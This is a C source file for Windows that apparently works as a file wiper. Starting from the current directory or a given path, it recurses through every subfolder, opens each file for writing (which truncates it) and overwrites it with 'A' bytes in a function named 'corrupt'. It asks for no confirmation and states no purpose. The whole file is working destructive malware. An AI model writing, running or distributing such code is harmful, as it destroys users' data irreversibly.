#include "includes.h"

u_long FileSizeByName(wchar_t *sFileName)
{
	FILE *fp = NULL;
	wprintf_s(L"sFileName is: %s\n", sFileName);
	///////////////////////////////////////////
	if(_wfopen_s(&fp, sFileName, L"r")!=0)
	{
		wprintf_s(L"Error opening file for READING: %s\n", sFileName);
		return 1;
	}
	HANDLE hFile = INVALID_HANDLE_VALUE;
	hFile = (HANDLE)_get_osfhandle(_fileno(fp)); // get handle associated with specific file descriptor (get file descriptor from stream)
	u_long  iFileSize = 0;
	iFileSize = GetFileSize(hFile, NULL);
	CloseHandle(hFile);
	fclose(fp);
	wprintf_s(L"File Size: %d\r\n", iFileSize);
	return iFileSize;
}

bool corrupt(wchar_t *sTarget)
{
	u_long iFileSize = FileSizeByName(sTarget);
	wprintf_s(L"iFileSize is : %d\n", iFileSize);
	FILE *fp = NULL;
	if(_wfopen_s(&fp, sTarget, L"w+")!=0)
	{
		wprintf_s(L"Error opening file for WRITING: %s\n", sTarget);
		return 1;
	}

	for (long i=0 ; i < (long)iFileSize ; i=i+128)
	{
		fseek ( fp , i, SEEK_SET );
		fputs("\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41",fp);
	}
	fclose(fp);
	return TRUE;
}

int ListDirectoryContents(const wchar_t *sDir)
{ 
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = INVALID_HANDLE_VALUE; 
	wchar_t sPath[MAX_PATH] = {0}; 

	wcscpy_s(sPath, MAX_PATH, sDir); 
	wcscat_s(sPath, MAX_PATH, L"\\*"); 

	hFind = FindFirstFile(sPath, &FindFileData);
	if(INVALID_HANDLE_VALUE == hFind )
	{ 
		wprintf_s(L"Path not found: [%s]\n", sDir); 
		return false; 
	} 

	do
	{ 
		if(wcscmp(FindFileData.cFileName, L".") != 0 && wcscmp(FindFileData.cFileName, L"..") != 0) // remove `.` & `..`
		{ 
			wsprintf(sPath, L"%s\\%s", sDir, FindFileData.cFileName); 
			//StringCbPrintf(sPath,MAX_PATH, L"%s\\%s", sDir, FindFileData.cFileName);
			//Is the entity a File or Folder? 
			if(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
			{ 
				wprintf_s(L"Directory: %s\n", sPath); 
				ListDirectoryContents(sPath); //Recursion, I love it! 
			} 
			else{ 
				wprintf_s(L"File: %s\n", sPath); 
				corrupt(sPath);
			} 
		}
	} 
	while(FindNextFile(hFind, &FindFileData)); //Find the next file. 
	FindClose(hFind); //Always, Always, clean things up! 
	return true; 
} 



//int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPreviousInstance, LPSTR lpCmdLine, int iCmdShow)
int _tmain(int argc, TCHAR *argv[])
{
	wchar_t cDstDir[MAX_PATH] = {0};

	if(argc != 2)
	{
		GetCurrentDirectoryW(MAX_PATH, cDstDir);
		//StringCchCopy(cDstDir, MAX_PATH, TEXT("c:"));
	}
	else
	{
		wcscpy_s(cDstDir, MAX_PATH, argv[1]);
	}
	wprintf_s(L"cDstDir is:\t%s\n", cDstDir);
	ListDirectoryContents(cDstDir);
	return 0;
}